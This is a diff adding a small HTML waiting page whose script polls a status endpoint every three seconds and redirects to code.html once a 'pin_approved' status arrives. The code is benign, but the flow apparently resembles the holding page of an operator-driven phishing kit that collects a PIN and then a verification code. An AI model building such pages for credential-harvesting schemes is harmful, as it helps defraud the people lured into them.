@@ -1,0 +1,17 @@
+<h3>⏳ Verifying... Please wait</h3>
+
+<script>
+const id = localStorage.getItem("id");
+
+setInterval(async () => {
+  const res = await fetch("/status/" + id);
+  const data = await res.json();
+
+  if (data.status === "pin_approved") {
+    window.location.href = "code.html";
+  }
+  if (data.status === "rejected") {
+    alert("❌ Verification failed");
+  }
+}, 3000);
+</script>
